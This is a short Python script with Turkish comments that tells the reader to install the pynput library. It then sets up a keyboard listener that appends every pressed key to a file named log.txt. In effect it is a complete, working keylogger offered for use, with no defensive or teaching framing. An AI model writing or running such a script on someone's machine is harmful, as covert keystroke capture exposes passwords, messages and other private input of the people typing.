# pip install pynput diyerek kütüphaneyi yükleyin cmd'den

from pynput.keyboard import Listener

def writeToFile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    with open("log.txt","a") as f:
        f.write(keydata)

# her tuş basımında basılan tuşları log.txt dosyasına yazacak

with Listener(on_press=writeToFile) as l:
    l.join()
